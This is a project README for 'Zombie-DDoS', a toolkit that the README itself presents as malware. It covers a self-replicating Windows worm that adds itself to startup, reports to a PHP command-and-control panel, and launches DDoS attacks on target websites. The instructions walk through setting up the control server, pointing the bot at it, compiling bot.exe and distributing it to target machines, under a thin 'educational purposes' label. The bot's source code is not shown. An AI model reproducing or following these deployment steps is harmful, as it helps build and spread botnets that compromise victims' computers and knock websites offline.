# Zombie-DDoS

**Zombie-DDoS** is a Distributed Denial-of-Service (DDoS) toolkit using Windows systems as zombies. This toolkit is designed for educational purposes to demonstrate how botnets and DDoS attacks work. The bot, once executed on a Windows machine, connects to a PHP control panel, allowing the attacker to manage and control the bots remotely.

## Features:
- **Self-Replicating Worm**: The bot replicates itself on infected machines and ensures it runs on startup.
- **DDoS Attacks**: Perform DDoS attacks on websites by utilizing the power of multiple bot systems.
- **Remote Control**: The bot communicates with a PHP server to receive attack commands.
- **Simple Control Panel**: The control panel allows you to manage bots and issue attack commands.

---

## Setup Instructions

### 1. Server Setup (Control Panel)
To set up the control panel to manage the bots, follow these steps:

1. Clone the repository to your server:
    ```bash
    git clone https://github.com/yourusername/Zombie-DDoS.git
    ```

2. Upload the contents of the `server` directory to your PHP hosting server.
   
3. In the `zombie.cpp` file, replace `SERVER_URL` with the URL of your PHP server:
    ```cpp
    #define SERVER_URL "http://yourserver.com"
    ```

4. Ensure that the PHP server is correctly configured to accept requests from the bot, and test the connection by visiting the server's `index.php`.

---

### 2. Building the Worm (Bot)
1. Open `zombie.cpp` in your C++ IDE or text editor.
   
2. Compile the code using any C++ compiler (e.g., Visual Studio, Code::Blocks):
    ```bash
    g++ zombie.cpp -o bot.exe
    ```

3. The bot (`bot.exe`) will now be compiled and ready to be distributed to target Windows systems.

4. The bot will:
    - Register itself to the server on first launch.
    - Save itself to the system's startup folder to run at every boot.

---

### 3. Running the Bot
To run the bot:

1. Distribute the compiled `bot.exe` to target systems.
   
2. Once executed, the bot will automatically:
    - Connect to the PHP control panel and register itself.
    - Check for DDoS attack commands sent from the control panel.
    - Replicate itself to other locations (optional).

---

## Control Panel (PHP Server)

To control the bots, you need to set up the control panel on a PHP server. The control panel can issue commands to the bots, including the target URL for DDoS attacks.
